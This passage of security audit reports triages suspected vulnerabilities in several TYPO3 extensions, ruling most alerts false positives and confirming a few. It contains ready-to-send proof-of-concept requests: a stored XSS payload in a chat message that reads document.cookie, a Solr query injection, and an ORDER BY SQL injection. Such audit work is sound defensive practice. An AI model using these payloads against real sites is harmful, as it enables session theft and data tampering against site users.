- `callback` request param is reflected unescaped, but the response is `Content-Type: application/json`. A browser navigating to it does not render HTML/JS. This is a JSONP wrapper; loading it via `<script src>` executes in the *attacker's* own page context, not the victim origin → no cross-site script execution against jvchat users.
- Additionally only reachable through `postImage()` (`a=pi`), which requires a multipart file upload and a room/user context.
- **Kill reason**: `application/json` content type; JSONP callback is not reflected into an HTML/JS markup context that executes on the victim.

## Issue 2 — CodeQL Reflected XSS `Classes/Eid/Chat.php:980` (`returnMessage` XML echo)

**Verdict: FALSE POSITIVE (as *reflected* XSS) — but this is the echo used by the CONFIRMED stored XSS below**

```php
// Chat.php:967  $out .= '<msg><![CDATA['.$message.']]></msg>';
// Chat.php:978  header('Content-Type: application/xml; charset=utf-8');
// Chat.php:980  echo $returnMsg; exit;
```
- Response is `Content-Type: application/xml`, and message payloads are wrapped in `<![CDATA[...]]>`. On direct navigation the browser parses it as an XML document; CDATA text is **not** executed. So a crafted *link* does not fire script → not a classic reflected XSS.
- The values only become executable when the chat's own same-origin JavaScript client fetches this endpoint and injects the CDATA into the DOM (`tx_jvchat.min.js` → `createNewMessageNode`: `idsearch.innerHTML=message`). That is the **stored/DOM** path (Issue 3), not a reflected-by-link vector.
- **Kill reason (for reflected)**: `application/xml` + CDATA, not rendered as HTML on navigation.

## Issue 3 — STORED XSS via chat message (`m`) → `formatMessage` BBCode `[img]` → raw Fluid → client `innerHTML`

**Verdict: CONFIRMED STORED XSS (authenticated frontend user)**

### Tainted chain
1. `Classes/Eid/Chat.php:124-128` — message input taken from request and only `<`/`>` are entity-encoded; **`"` `'` `[` `]` are NOT filtered**:
   ```php
   $this->env['msg'] = $body['m'] ?? $query['m'] ?? null;      // :124
   $this->env['msg'] = rawurldecode($this->env['msg']);         // :126
   $this->env['msg'] = str_replace('<','&lt;', ...);            // :127
   $this->env['msg'] = str_replace('>','&gt;', ...);            // :128
   ```
2. `Chat.php:514-515` (`a=sm`) → `putMessage($this->env['msg'], ...)` → `Chat.php:1038` → `DbRepository::putMessage` (`DbRepository.php:611-633`) stores the raw string in `tx_jvchat_entry.entry` (parameterized insert — safe from SQLi, but stores the payload verbatim).
3. On any user's poll (`a=gm`) → `getMessages` (`Chat.php:760,829`):
   ```php
   $entryText = LibUtility::formatMessage($entry->entry, ...);  // :829
   ```
4. `Classes/Utility/LibUtility.php:271` regenerates a **raw `<img>` tag** from BBCode, inserting the attacker substrings into `src="..."` and an `onclick="...('...')"` JS string with **no quote-escaping**:
   ```php
   $text = preg_replace('/\[img=(.*?)\](.*?)\[\/img\]/i',
     '<img title="click me" ... src="\2" onclick="tx_jvchat_pi1_js_chat_instance.showChatImg(\'\1\');" />', $text);
   ```
   Because `"` was never filtered, `\2` (or `\1`) breaks out of the attribute and injects new event-handler attributes.
5. Fluid template `Resources/Private/Templates/*/Pi1/GetMessages.html` emits it **unescaped**: the whole section is inside `<f:format.raw>` and entryText is `<span class="tx-jvchat-entry-text"><f:format.raw>{entryText}</f:format.raw></span>`.
6. `returnMessage` wraps it in `<msg><![CDATA[...]]></msg>` and echoes (`Chat.php:967/980`).
7. Client sink `Resources/Public/Js/tx_jvchat.min.js` → `parseMessages` → `createNewMessageNode`: **`idsearch.innerHTML=message`** — injects the raw `<img ... onerror=...>` into the page of **every user in the room**. `<img onerror>` fires without user interaction under `innerHTML`.

### Exact request to trigger (store the payload)
```
POST /index.php?eIDMW=tx_jvchat_pi1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: fe_typo_user=<valid frontend session>

r=<ROOM_ID>&p=<PID>&a=sm&t=0&l=en&charset=utf-8&m=%5Bimg%3Dx%5Da%22%20onerror%3D%22alert(document.cookie)%22%20x%3D%22%5B%2Fimg%5D
```
(`m` = `[img=x]a" onerror="alert(document.cookie)" x="[/img]`). Every other room member's chat client then executes `alert(document.cookie)` when it renders the message. An interaction-free alternative also works via the `onclick` JS-string break-out: `[img=');alert(document.cookie)//]a[/img]`.

### Auth level
Posting requires a **logged-in frontend user**: `putMessage` → `LibUtility::checkAccessToRoom($room,$user)` returns `false` when `$user` is null (`LibUtility.php:44`). So this is an **authenticated** stored XSS — exploitable by any frontend user who can post to a room (self-registration is common for chat), and it lands on all other users including moderators/superusers. The *endpoint* itself is pre-auth reachable, but message persistence is gated on FE login.

---

## Issue 4 — SQL injection in eID DB queries

**Verdict: FALSE POSITIVE**

- All request-derived numeric inputs are `intval()`-cast in `Chat::init` (`room_id`, `uid`, `lastid`, `pid`, `uc` — lines 116,120,131-133) before reaching the DB layer.
- `Classes/Domain/Repository/DbRepository.php` uses Doctrine `QueryBuilder` with `createNamedParameter(..., Connection::PARAM_INT/PARAM_STR)` throughout; the message body is stored via `->insert()->values($data)` (parameterized). `getFeUserByName` uses `strip_tags` + `PARAM_STR` named parameter. No request value is concatenated into raw SQL. (`setUserlistSnippet`/`setTooltipSnippet` set non-request-derived data.)

---

### Summary
| Sink | Verdict |
|---|---|
| `Chat.php:689` reflected XSS (JSONP) | FALSE POSITIVE (application/json) |
| `Chat.php:980` reflected XSS (XML echo) | FALSE POSITIVE as reflected (application/xml + CDATA); it is the echo of the confirmed stored XSS |
| `JvchatEid.php:41` / `:48` reflected XSS | FALSE POSITIVE (script not registered as eID → unreachable; timer output not tainted) |
| **Chat message `m` → `formatMessage [img]` → raw Fluid → client `innerHTML`** | **CONFIRMED STORED XSS (authenticated FE user)** |
| eID DB SQLi | FALSE POSITIVE (int-cast + parameterized QueryBuilder) |

### jweiland_events2

#### Security Audit — jweiland/events2

**Version audited:** 10.2.10 (ext_emconf.php / composer.json), TYPO3 v13.4 line
**Scope:** pre-auth exploitable vulnerabilities reachable from an unauthenticated frontend HTTP request.
**Summary:** No pre-auth exploitable vulnerability found. Every request-reachable SQL sink is parameterized (`createNamedParameter` / `quote` + `escapeLikeWildcards` / `MathUtility` / `intExplode`), rendered output is Fluid-escaped, the iCal download builds its own filename, there is no outbound fetch on any frontend path, and the entire event create/edit/delete flow is auth-gated by `RestrictAccessEventListener` (requires fe_user login + configured userGroup + assigned organizer). Findings below are the traced surfaces and why each is NOT exploitable, plus two low/informational notes.

---

## Pre-auth attack surface map

| Surface | Entry point | Auth | Notes |
|---|---|---|---|
| iCal download | `ICalController::downloadAction(int $dayUid)` | pre-auth | int arg, internal filename |
| Event search | `SearchController::show / listSearchResults(?Search)` | pre-auth | LIKE via `quote()`+`escapeLikeWildcards`, `setSearch` also `htmlspecialchars` |
| Day list/show | `DayController::list/show` | pre-auth | int args, parameterized |
| Location show | `LocationController::showAction(Location)` | pre-auth | Extbase model, escaped output |
| Video show | `VideoController::showAction(int $event)` | pre-auth | int arg |
| Calendar AJAX | `GetDaysForMonthMiddleware` (`ext-events2: getDaysForMonth`) | pre-auth | `MathUtility::forceIntegerInRange` + `intExplode` |
| Location autocomplete | `GetLocationsMiddleware` (`getLocations`) | pre-auth | `strip_tags`+`htmlspecialchars`, then `escapeLikeWildcards` |
| Sub-categories AJAX | `GetSubCategoriesMiddleware` (`getSubCategories`) | pre-auth | `(int)` cast |
| URI for day AJAX | `GetUriForDayMiddleware` (`getUriForDay`) | pre-auth | `MathUtility::forceIntegerInRange` |
| Attach organizer | `AttachOrganizerToEventMiddleware` | pre-auth trigger | only fires when fe_user has organizer; value is server-side user field |
| Event create/edit/delete | `ManagementController` | **auth-gated** | blocked by `RestrictAccessEventListener` |
| Reaction import | `ImportEventsReaction` | **auth-gated** | TYPO3 reaction secret required |

---

## Findings (traced source → sink)

### 1. Frontend event CREATE / stored XSS-injection — NOT pre-auth (auth-gated)
- **Severity:** N/A (mitigated by access control) · **Pre-auth:** No
- **Source:** `tx_events2_management[event][...]` → `ManagementController::createAction(Event $event)` (`Classes/Controller/ManagementController.php:94`)
- **Gate:** `RestrictAccessEventListener::isAccessAllowed()` (`Classes/EventListener/RestrictAccessEventListener.php:97-139`) runs in `preProcessControllerAction` for every Management action and forwards to `errorAction` unless: `settings.userGroup` configured, `frontend.user` is logged in, user is in that group, and the user has `tx_events2_organizer` set. Edit/update/delete additionally require `getIsCurrentUserAllowedOrganizer()`.
- **Sink behavior:** created event is forced `setHidden(true)` (`:96`) and only becomes visible after a backend editor activates it; fields render through Fluid (auto-escaped) and `detail_information` through `f:format.html(parseFuncTSPath: lib.parseFunc)` (RTE-sanitized).
- **Exploitability:** Not reachable pre-auth. Any stored-XSS would require a valid FE account in the allowed group *and* an editor to activate the record — outside the pre-auth threat model.

### 2. Event search filter → SQL — NOT vulnerable
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Source:** `search[search]`, `search[eventBegin/eventEnd]`, `search[mainCategory]`, `search[location]`, `search[storagePids][]` → `SearchController::listSearchResultsAction(?Search)` → `DayRepository::searchEvents()` (`Classes/Domain/Repository/DayRepository.php:204`)
- **Sink:** free-text LIKE at `DayRepository.php:223-234` uses `$queryBuilder->quote('%' . escapeLikeWildcards($search->getSearch()) . '%')`; `Search::setSearch()` additionally applies `htmlspecialchars` (`Classes/Domain/Model/Search.php:49`). Category/location/attendance use typed `createNamedParameter`; `storagePids` bound as `ArrayParameterType::INTEGER` in `DatabaseService::addConstraintForPid` (`Classes/Service/DatabaseService.php:212`).
- **Exploitability:** None — all tainted values are quoted/parameterized/typed.

### 3. iCal download → path traversal — NOT vulnerable
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Source:** `tx_events2_ical[dayUid]` → `ICalController::downloadAction(int $dayUid)` (`Classes/Controller/ICalController.php:36`)
- **Sink:** `DownloadHelper::forceDownloadFile()` (`Classes/Helper/DownloadHelper.php:66`) streams an **in-memory string**, not a filesystem path; filename is `ICalendarHelper::getEventUid()` = `'event' . uniqid(...)` (`Classes/Helper/ICalendarHelper.php:267`), fully server-generated. `$dayUid` is an `int` and only used as a DB identifier lookup.
- **Exploitability:** None — no user-controlled path segment; no filename injection (filename is not attacker-derived).

### 4. Location / poimap → SSRF — NOT present
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Trace:** `LocationController::showAction(Location)` and `LocationService` only run parameterized DB `SELECT`s (`Classes/Service/LocationService.php:28-51`). No `getUrl`/HTTP client on any frontend path. Map rendering is delegated to the optional `maps2` extension (not part of this codebase). The only `GeneralUtility::getUrl()` calls live in `Importer/JsonImporter.php:406` and `Importer/XmlImporter.php:531`, reachable only via the auth-gated reaction / scheduler task, not from a frontend request.
- **Exploitability:** No pre-auth SSRF.

### 5. Object injection / unserialize — NOT present
- No `unserialize()` of request data anywhere in `Classes/`. Extbase property mapping into the `Event`/`Search` models is type-constrained; `Search`/`Filter` are non-persisted DTOs.

### 6. Calendar / autocomplete AJAX middlewares → SQLi — NOT vulnerable
- **Source:** JSON POST body of the four `ext-events2` middlewares.
- **Sinks:** `GetDaysForMonthMiddleware` casts `month`/`year` via `MathUtility::forceIntegerInRange` and `categories`/`storagePages` via `GeneralUtility::intExplode`, then `DatabaseService::getDaysInRange()` binds everything with `createNamedParameter` (`Classes/Service/DatabaseService.php:75-155`). `GetSubCategoriesMiddleware` casts `(int)`. `GetLocationsMiddleware` runs `strip_tags`+`htmlspecialchars` then `escapeLikeWildcards`+`createNamedParameter` in `LocationRecordService::findLocations` (`Classes/Service/Record/LocationRecordService.php:31-61`). `GetUriForDayMiddleware` uses `forceIntegerInRange`.
- **Exploitability:** None.

---

## Low / Informational notes (not pre-auth exploitable)

- **iCal `LOCATION:` line not sanitized** — `ICalendarHelper::addEventLocation()` (`Classes/Helper/ICalendarHelper.php:182-187`) emits `getLocationAsString()` without the `sanitizeString()` applied to SUMMARY/DESCRIPTION. This is a theoretical iCal line-injection into a downloaded `.ics`, but the location string derives from backend-managed `tx_events2_domain_model_location` records (a FE creator selects a location by uid, not free text), so it is not attacker-controlled pre-auth. Cosmetic/robustness fix at best.
- **`CreateYoutubeUriViewHelper` fallback** — on a non-matching link it returns `'//www.youtube.com/embed/' . $link` with the raw value (`Classes/ViewHelpers/CreateYoutubeUriViewHelper.php:57`). Rendered into an iframe `src`, Fluid escapes the attribute; the field is organizer/backend-managed (post-auth). Not pre-auth.
- **`storagePids` in search** can be supplied by the client (`search[storagePids][]`) and widens which storage folders are queried, but values are INT-bound (no SQLi) and events are public content — negligible info-disclosure at most.

---

## Known CVEs / advisories cross-reference

- No public CVE / TYPO3-EXT-SA advisory is known to affect **events2 10.2.10** (current release for TYPO3 v13.4, 2025).
- The code shows the defensive patterns that historically hardened this extension: the frontend event-management flow is fully gated behind `RestrictAccessEventListener`, newly created events are force-hidden pending editor activation, and all AJAX/search DB access is parameterized. No regression of those mitigations was found.
- Recommendation: track the `jweiland-net/events2` GitHub security advisories feed; nothing in this version requires remediation for the pre-auth threat model.

### jweiland_kk-downloader

#### jweiland_kk-downloader — SQL injection audit (Target C)

**Verdict: CONFIG/DB-SOURCED (FlexForm, editor-controlled allowlist). NOT pre-auth.**

The ORDER BY injection is real at the code level, but the tainted values come
from the plugin's FlexForm configuration (`pi_flexform`, set by a backend editor
and stored in the DB) — not from any frontend request parameter. Both fields are
fixed `selectSingle` allowlists. An anonymous frontend visitor cannot influence
them.

## Version / compat
- Version: **7.0.0**
- TYPO3: **10.4.37 – 11.5.99** (`ext_emconf.php`)

## Sink — `Classes/Domain/Repository/DownloadRepository.php:67,71,72`
`getDownloads(array $storagePages, int $categoryUid, string $orderBy, string $direction, int $limit, int $offset)`:
```php
if ($orderBy === '') {
    $queryBuilder->orderBy('i.name', 'ASC');
} else {
    $queryBuilder->orderBy('i.' . $orderBy, $direction);   // line 67
}
$statement = $queryBuilder
    ->setMaxResults($limit)     // line 71 — typed int, safe
    ->setFirstResult($offset)   // line 72 — typed int, safe
    ->execute();
```
Only **line 67** is a candidate: `'i.' . $orderBy` (identifier) and `$direction`
(ORDER direction, appended raw) concatenated into `orderBy()`. Lines 71-72 take
typed `int` (`$limit`, `$offset`) — not injectable.

## Tainted chain (source is FlexForm config, not request)
- `Classes/Plugin/KkDownloader.php:179-186` calls
  `getDownloads($storagePages, $this->settings['categoryUid'], $this->settings['orderBy'], $this->settings['orderDirection'], …)`
- `$this->settings` is populated by `getFlexFormSettings()`:
  - `Classes/Plugin/KkDownloader.php:283` `$settings['orderBy'] = $this->getFlexFormValue('orderby');`
  - `Classes/Plugin/KkDownloader.php:284-285` `$settings['orderDirection'] = $this->getFlexFormValue('ascdesc') ?: 'ASC';`
- `getFlexFormValue()` (`KkDownloader.php:312-314`) =
  `pi_getFFvalue($this->cObj->data['pi_flexform'], $field, $sheet)` — reads the
  content element's **`pi_flexform`** column (backend-editor configuration stored
  in the DB), **not** `$_GET`/`$_POST`/piVars.

There is no path from a frontend request parameter (piVars, query args) to
`$orderBy`/`$direction`. (The only request-derived value near this call is
`$this->piVars['pointer']`, which is `(int)`-cast into `$offset` at line 185 —
safe.)

## FlexForm fields are fixed allowlists — `Configuration/FlexForms/KkDownloader.xml`
- `<orderby>`: `type=select` / `selectSingle`, values limited to
  `name`, `image`, `crdate`, `tstamp`, `cat`, `last_downloaded`, `sorting`.
- `<ascdesc>`: `type=select` / `selectSingle`, values limited to `ASC`, `DESC`.

So even the backend editor is constrained to a safe allowlist through the TCEforms
UI.

## Reachability / auth
The plugin (`Classes/Plugin/KkDownloader.php`) is an anonymous frontend
pi_base plugin (`FrontendRestrictionContainer`), but the injectable arguments are
sourced from the content element's FlexForm, which requires **backend editor
access** to set and is delivered from the DB, not the HTTP request.

## Trigger
None from the frontend. An anonymous visitor has no request parameter that
reaches `orderBy`. Reaching the raw ORDER BY would require backend write access
to the `pi_flexform` value *and* bypassing the FlexForm select allowlist — i.e.
an authenticated, privileged backend action, not a pre-auth frontend SQLi.

## Bottom line
Real ORDER BY concatenation, but **config/DB-sourced via FlexForm** and
allowlist-constrained. **Not a pre-auth SQL injection.**

### kitodo_kitodo_presentation

#### kitodo_presentation — SearchInDocument / SearchSuggest

**Extension:** Kitodo.Presentation (`dlf`) v7.0.1 — TYPO3 `12.4.0-13.4.99`
**Files:** `Classes/Middleware/SearchInDocument.php:152`, `Classes/Middleware/SearchSuggest.php:64`

## Verdict: FALSE POSITIVE for SQLi — the sink is an Apache Solr (Solarium) query, not DB SQL. At most **search-query injection** (low impact).

Both CodeQL "SQL injection" alerts land on `$query->setQuery(...)` calls against **Solarium query objects**, i.e. Apache Solr query strings. Confirmed:

- `Classes/Common/Solr/Solr.php:19` `use Solarium\Client;`
- `Solr.php:115` `protected Client $service;` (Solarium\Client = Apache Solr client)
- `Solr.php:581` `$this->service = GeneralUtility::makeInstance(Client::class, ...)`
- `SearchInDocument.php:150` `$this->solr->service->createSelect()` → Solarium select query
- `SearchInDocument.php:152` `$query->setQuery($this->getQuery($parameters))` — sets the **Solr query string**
- `SearchSuggest.php:63-64` `$solr->service->createSuggester(); $query->setQuery(...)` — Solr suggester query

No `QueryBuilder`, no `->where($raw)`, no `exec_SELECT*`, no PDO/`->query()`. The value never reaches a relational database. A "SQL injection" classification is incorrect. The relevant (much lower) risk is Solr query-syntax injection.

### SearchInDocument.php:152 — tainted chain
- `SearchInDocument.php:66` `$parameters = (array) $request->getParsedBody();` (POST body, taint source)
- `:89` `$this->executeSolrQuery($parameters)`
- `:152` `$query->setQuery($this->getQuery($parameters))`
- `:184-187` `getQuery()` builds:
  `fulltext:(' . Solr::escapeQuery((string)$parameters['q']) . ') AND uid:' . getUid($parameters['uid'])`
  - `$parameters['q']` → `Solr::escapeQuery()` (`Solr.php:181`) escapes `{ } [ ] : / \` — blocks Solr field/range operators. Sanitized against Solr-syntax abuse.
  - `$parameters['uid']` → `getUid()` (`:199-202`): `is_numeric ? (int) : $uid`. **A non-numeric `uid` is passed through unescaped into the Solr query string.** This is a genuine but limited **Solr query injection** (attacker can alter the Solr query for the `uid` clause, e.g. inject `*:*`), scoped to read access on the Solr fulltext index — not the SQL DB.

### SearchSuggest.php:64 — tainted chain
- `SearchSuggest.php:48` `$parameters = (array) $request->getParsedBody();`
- `:57` HMAC gate: `hash_equals(GeneralUtility::hmac((string)(new Typo3Version()).Environment::getExtensionsPath(), 'SearchSuggest'), $uHash)` — `GeneralUtility::hmac` keys on the site **encryptionKey** (secret). Request must carry a valid `uHash`, so this endpoint is **effectively gated by a server secret** and not freely forgeable.
- `:64` `$query->setQuery(Solr::escapeQuery((string)$parameters['q']))` — `q` is escaped; Solr suggester query. No injectable path of note.

## Reachability / auth
- Registered in `Configuration/RequestMiddlewares.php` under `frontend`, `after: typo3/cms-frontend/prepare-tsfe-rendering`. Runs in the **frontend PSR-15 stack, unauthenticated**.
- Activation: **SearchInDocument** requires POST body `middleware=dlf/search-in-document` (`:68`) + non-empty `encrypted` (a `Helper::decrypt`-able Solr core name). No login required → pre-auth reachable, but sink is Solr not SQL.
- **SearchSuggest** requires `middleware=dlf/search-suggest` + a valid `uHash` HMAC (encryptionKey-derived) → not truly anonymous.

## Trigger (SearchInDocument, the pre-auth Solr-injection vector)
```
POST /?type=0 HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded

middleware=dlf/search-in-document&encrypted=<valid-encrypted-core>&pid=<pid>&uid=*:*&q=test&start=0
```
`encrypted` must be a valid `Helper::decrypt` core token (encryptionKey-dependent), which limits practical exploitation. Impact if reached: manipulation of the Solr query (index read), **not** SQL DB compromise.

## Bottom line
Not SQL injection. Rate as low-severity **Solr search-query injection** on the unescaped `uid` in `SearchInDocument::getQuery`; `q` is escaped in both middlewares; `SearchSuggest` is additionally HMAC-gated.

### kohlercode_slug

#### kohlercode_slug — SQL injection audit (Target A)

**Verdict: BACKEND-ONLY (authenticated BE user). NOT pre-auth.**

Real ORDER BY / identifier injection exists, but every entry point is a TYPO3
backend AJAX route gated by backend user authentication. The extension name
"slug" is misleading: despite the task hypothesis, this is **not** a frontend
slug-resolution middleware. `ext_emconf.php` declares `'category' => 'module'`
and the description reads *"TYPO3 backend module for efficient management of URL
slugs"*. There is no frontend middleware, eID, or route enhancer in the
extension — only `Configuration/Backend/AjaxRoutes.php` and
`Configuration/Backend/Modules.php`.

## Version / compat
- Version: **5.1.0** (state: alpha)
- TYPO3: **14.1.0 – 14.1.99** (`ext_emconf.php`)

## Sinks

### PageRepository::getPageDataForList — `Classes/Domain/Repository/PageRepository.php:135-136`
```php
->setMaxResults($maxitems)
->orderBy($orderby ?: 'p.crdate', $order ?: 'DESC');
```
`$orderby` and `$order` are concatenated into `orderBy()`. The ORDER direction
argument (`$order`) is appended raw by the underlying Doctrine query builder and
is not parameterizable — a genuine ORDER BY injection. (`$maxitems` reaches
`setMaxResults`, int-coerced; the `$searchkey`/`$status` branches all use
`createNamedParameter`, so those are clean.)

### RecordRepository::getRecordDataForList — `Classes/Domain/Repository/RecordRepository.php:87-89`
```php
->setMaxResults($maxitems)
->orderBy($orderby ?: 'crdate', $order ?: 'DESC');
```
Same ORDER BY injection via `$orderby`/`$order`. **Additionally**, this method
concatenates `$tableName`, `$slugField`, and `$titleField` directly into
`select()`/`from()`/`leftJoin()` (lines 51-71) with no quoting — raw table- and
column-identifier injection on top of the ORDER BY issue.

## Tainted chain (request → raw SQL)
Both flow from `$request->getQueryParams()` in the AJAX controller:

- `Classes/Controller/AjaxController.php:57-65` `listAction()`
  `$params = $request->getQueryParams();`
  → `getPageDataForList($params['maxentries'], $params['key'], $params['orderby'], $params['order'], $params['status'])`
  → `PageRepository.php:136` `orderBy($orderby, $order)`
- `Classes/Controller/AjaxController.php:79-90` `recordAction()`
  `$params = $request->getQueryParams();`
  → `getRecordDataForList($params['table'], $params['slug'], $params['title'], $params['maxentries'], $params['key'], $params['orderby'], $params['order'], $params['status'])`
  → `RecordRepository.php:51-89` (`from($params['table'])`, `select('p.'.$slugField...)`, `orderBy($orderby, $order)`)

The values are request-controlled, but the route is backend-scoped.

## Reachability / auth
Routes are registered in `Configuration/Backend/AjaxRoutes.php`
(`slug_list` → `/slug/list` → `AjaxController::listAction`; `slug_record` →
`/slug/record` → `AjaxController::recordAction`). Backend AJAX routes are
dispatched under `/typo3/ajax/…` through TYPO3's backend request handler and
require a **valid backend user session** (BackendUserAuthenticator); none of
these routes declare `'access' => 'public'`. They are additionally CSRF-token
protected. **A logged-in backend user is required — this is not reachable
pre-auth.**

## Trigger (requires authenticated BE session + CSRF token)
```
GET /typo3/ajax/slug/record?token=<be-csrf-token>
    &table=pages&slug=slug&title=title&maxentries=10&key=&status=all
    &orderby=uid&order=ASC,(SELECT ... )
```
(equivalently `.../slug/list?...&order=<injection>`). Not exploitable by an
anonymous visitor.

## Bottom line
Genuine SQL injection (ORDER BY direction/field, plus table/column identifier
injection in `RecordRepository`), **authenticated backend only**. Not a
pre-auth / frontend-reachable SQLi.

### labor-digital_typo3-frontend-api

#### labor-digital_typo3-frontend-api (T3FA) — TransformationSchema.php:119

## Verdict: FALSE POSITIVE (callable identity is reflection/config-sourced, not request-controlled)

**Sink (line 119):** `return $value->$method();` — a dynamic method call.

```php
110  public function getValue(object $value, string $property)
111  {
112      if (! isset($this->properties[$property])) return null;
116      if ($this->properties[$property][0] === AbstractReflector::PROPERTY_ACCESS_GETTER) {
117          $method = $this->properties[$property][1];
119          return $value->$method();
```

`$method` is the callable identity. It comes from `$this->properties[$property][1]`, and `$this->properties` is populated exclusively by the schema reflectors, not by the request:

`Reflection/AbstractReflector.php:76-91`
```php
foreach ($ref->getMethods(ReflectionMethod::IS_PUBLIC) as $method) {
    $methodName = $method->getName();               // from PHP reflection of the class
    if (str_starts_with(..., 'is'|'has'|'get')) {
        if ($method->getNumberOfRequiredParameters() !== 0) continue;
        $properties[Inflector::toProperty($methodName)] = [PROPERTY_ACCESS_GETTER, $methodName];
    }
}
```

So `$method` can only ever be the name of an **existing zero-argument public getter (`get*`/`is*`/`has*`) of the object being transformed** (`$value`), discovered by `ReflectionClass` over the server-side domain model. The request never supplies the method name.

Even the `$property` key selecting which getter to call is `array_keys($this->properties)` filtered by an allow/deny list (`getAllowedProperties()` / `getAttributes()`), i.e. still bounded to the reflected getter set — and no arguments are passed to the call. Request input controls neither the callable identity nor its arguments. This is ordinary getter dispatch, not code injection.

## Reachability / auth
The transformer does run on anonymous frontend API requests (this is a headless/SPA API extension). That satisfies pre-auth reachability, but the operation reached is a safe, bounded getter call, so reachability does not create a vulnerability.

## Version
`version => 10.8.4`, depends `typo3 10.0.0-10.99.99`, `t3ba 10.0.0-10.99.99`.

### lochmueller_fl_realurl_image

#### Target C — lochmueller_fl_realurl_image — `RealUrlImage.php:110`

## Verdict: **FALSE POSITIVE (cache/server-sourced) — not a pre-auth object-injection primitive**

The `unserialize()` operand comes from the extension's own TYPO3 caching-framework cache (`fl_realurl_image`), whose values are written server-side via `serialize()`. The attacker controls the cache *key* (derived from the request URL) but **not the serialized bytes**. Not raw attacker bytes → not POI.

## Source → sink chain

`Classes/RealUrlImage.php`, `showImage()`
```
:103  $path = str_replace(TYPO3_SITE_URL, '', TYPO3_REQUEST_URL);   // attacker influences the KEY only
:104  $path = trim($path, '/');
:105  $cacheIdentifier = $path;
:107  $cache = $this->getCache();                                   // CacheManager->getCache('fl_realurl_image')
:108  if ($cache->has($cacheIdentifier)) {
:110      $data = unserialize($cache->get($cacheIdentifier), FALSE); // SINK: value is server-written
```
The cache is populated only by this class:
- `writeDB()` → `:526 $cache->set($cacheIdent, serialize($data))` where `$data` is a server-built array (crdate/tstamp/image_path/new_path/page_id).
- `showImage()` → `:120 $cache->set($cacheIdentifier, serialize($data))`.

`$data` never contains attacker-supplied serialized-object bytes; the values are file paths, page IDs and timestamps assembled server-side. The `fl_realurl_image` cache uses the standard TYPO3 caching framework (DB/typo3temp backend) — a server-side store. **Cache/server-sourced.**

## allowed_classes: second argument is `FALSE`

`unserialize($cache->get($cacheIdentifier), FALSE)` passes `FALSE` as the `$options` parameter. `$options` expects an array such as `['allowed_classes' => false]`; a bare boolean is not the documented form and does **not** impose a class allowlist (it does not equal `['allowed_classes' => false]`). So this is effectively an unrestricted unserialize. It is nonetheless not exploitable here because the bytes are not attacker-controlled.

## Gadget

Not applicable — no attacker-controlled bytes reach the sink, so no gadget analysis is warranted for this path.

## Reachability / auth

`showImage()` is an emergency handler that runs on the frontend (pre-auth) when a realurl image is requested and the static file cache is missing. It is reachable by anonymous visitors, but reachability does not create a POI because the unserialized value is server-written cache content, not request bytes. To weaponize this, an attacker would need a *separate* cache-poisoning primitive letting them place arbitrary serialized bytes under a key equal to the request path — not present in this code.

## Version

- fl_realurl_image **6.0.1** (state: stable), `ext_emconf.php`.
- TYPO3 constraint: `typo3 => 12.4.0-12.4.99`, `php => 8.3.0+`.

### madj2k_t3-cat-search

#### madj2k / t3-cat-search — AbstractSearchController dynamic setter

**Verdict: FALSE POSITIVE (not code injection / not RCE)**

## Sink
`Classes/Controller/AbstractSearchController.php:271` & `:273`
```php
$search->$setter((int)$value);   // 271
$search->$setter($value);        // 273
```
Dynamic method call `$obj->$m(...)` on a fixed object.

## Identity-source chain
- `searchRelatedAction()` reads request input:
  - `:258` `$queryParams = $this->request->getQueryParams();`
  - `:263` `$params = $queryParams['tx_catsearch_search']['search'];`
  - `:266` `foreach ($params as $param => $value)`
  - `:268` `$setter = 'set' . ucfirst((string) $param);`
- **Guard at `:269`** `if (method_exists($search, $setter))` — the method is invoked only if it already exists on `$search`.
- `$search` is `GeneralUtility::makeInstance(Search::class)` (`:264`) — a `final` DTO (`Classes/Domain/DTO/Search.php:28`).

The callable identity is therefore constrained to the pre-existing `set*` methods of the `Search` DTO (`setTextQuery`, `setYear`, `setFilter1..5`, `setMultiSelectFilter1..5`, `setSorting`, `setLayout`, `setCurrentPage`, …), each a typed setter taking a single scalar/array argument. The attacker controls only the **argument**, never an arbitrary callable/class/path. This is a mass-assignment pattern over a transient search-filter DTO, not code execution. No `call_user_func` to an attacker-named target, no `new $cls`, no variable function.

Worst case is setting an unintended search property (e.g. `setLayout`) on an object that lives only for the duration of the request and only feeds a repository query — no privilege or state impact.

## Reachability / auth
Extbase plugin action on a public page; frontend search is anonymous. Reachable pre-auth — but there is nothing to exploit.

## Version
CatSearch **13.4.1**, TYPO3 `13.4.0–13.4.99`.

### maikschneider_tca-api

#### maikschneider / tca-api — AccessController callable dispatch

**Verdict: FALSE POSITIVE (callable identity is developer config, not request input)**

## Sink
`Classes/Security/AccessController.php:26`
```php
[$class, $method] = $requiredRole;
return (bool)GeneralUtility::makeInstance($class)->$method($request, $record);
```
`new $cls` (via `makeInstance`) + dynamic method `$obj->$method(...)`.

## Identity-source chain (config, not request)
`$requiredRole` is passed in by the dispatcher, sourced from the extension's TCA-API definition:
- `Classes/Dispatcher/RequestDispatcher.php:241` `$requiredRole = $config->securityRole($operation);`
- `Classes/Dispatcher/RequestDispatcher.php:242` `$this->accessController->isAllowed($requiredRole, $request, $existingRecord, $config)`
- `Classes/Configuration/ApiDefinition.php:82` `securityRole()` returns `$this->security[$operation]` (defaulting to `AccessRole::PUBLIC` for reads / `AccessRole::DISABLED` for writes).
- `ApiDefinition.php:303-322` validates each `security[...]` entry at build time: it must be an `AccessRole` enum, an `[AccessRole, groupIds]` tuple, or a `[class-string, method-string]` callable tuple — all authored in the developer's TCA/API configuration.

The `[$class, $method]` branch (`:20-26`) is only entered when `$requiredRole[0]` is **not** an `AccessRole` (`:21`), i.e. a developer-declared `[MyChecker::class, 'method']` custom access checker. `$request` and `$record` flow only as **arguments** to that fixed, config-named callable. No request parameter (`getQueryParams`/`getParsedBody`/etc.) reaches `$class` or `$method`. Standard extensible access-policy pattern — not injection.

## Reachability / auth
Invoked on the public FE API dispatch path (`RequestDispatcher`), but since the callable identity is static configuration there is nothing an anonymous request can redirect.

## Version
TCA API **0.6.2** (state: beta), TYPO3 `13.4.0–14.99.99`, requires `frontend`.

### maispace_assets

